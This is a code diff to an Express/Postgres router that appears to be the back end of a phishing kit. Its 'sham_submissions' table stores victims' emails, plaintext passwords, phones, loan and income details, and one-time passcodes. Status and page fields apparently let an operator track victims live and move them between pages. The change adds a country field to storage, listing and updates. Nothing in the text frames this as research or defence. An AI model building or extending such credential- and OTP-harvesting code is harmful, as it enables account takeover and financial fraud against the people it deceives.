@@ -12,14 +12,14 @@ router.post("/submissions", async (req, res) => {
     const {
       id, submittedAt, submittedAtTs, email, password, phone,
       loan, income, otpCode, otpStatus, changepassStatus, page,
-      isActive, lastSeen,
+      isActive, lastSeen, country,
     } = req.body;
 
     await pool.query(
       `INSERT INTO sham_submissions
         (id, submitted_at, submitted_at_ts, email, password, phone, loan, income,
-         otp_code, otp_status, changepass_status, page, is_active, last_seen)
-       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
+         otp_code, otp_status, changepass_status, page, is_active, last_seen, country)
+       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15)
        ON CONFLICT (id) DO UPDATE SET
          email = EXCLUDED.email,
          password = EXCLUDED.password,
@@ -31,9 +31,10 @@ router.post("/submissions", async (req, res) => {
          changepass_status = COALESCE(EXCLUDED.changepass_status, sham_submissions.changepass_status),
          page = EXCLUDED.page,
          is_active = EXCLUDED.is_active,
-         last_seen = EXCLUDED.last_seen`,
+         last_seen = EXCLUDED.last_seen,
+         country = COALESCE(NULLIF(EXCLUDED.country,''), sham_submissions.country)`,
       [id, submittedAt, submittedAtTs, email, password, phone, loan, income,
-       otpCode || "", otpStatus || null, changepassStatus || null, page, isActive, lastSeen]
+       otpCode || "", otpStatus || null, changepassStatus || null, page, isActive, lastSeen, country || ""]
     );
     res.json({ ok: true });
   } catch (err) {
@@ -62,6 +63,7 @@ router.get("/submissions", async (_req, res) => {
       page: r.page,
       isActive: r.is_active,
       lastSeen: Number(r.last_seen),
+      country: r.country || "",
     }));
     res.json(mapped);
   } catch (err) {
@@ -74,11 +76,12 @@ router.patch("/submissions/:id", async (req, res) => {
   try {
     const { id } = req.params;
     const updates: Record<string, unknown> = {};
-    const allowed = ["otp_code", "otp_status", "changepass_status", "page", "is_active", "last_seen", "email", "password", "phone", "loan", "income"];
+    const allowed = ["otp_code", "otp_status", "changepass_status", "page", "is_active", "last_seen", "email", "password", "phone", "loan", "income", "country"];
     const fieldMap: Record<string, string> = {
       otpCode: "otp_code", otpStatus: "otp_status", changepassStatus: "changepass_status",
       page: "page", isActive: "is_active", lastSeen: "last_seen",
       email: "email", password: "password", phone: "phone", loan: "loan", income: "income",
+      country: "country",
     };
     for (const [k, v] of Object.entries(req.body)) {
       const col = fieldMap[k] ?? k;
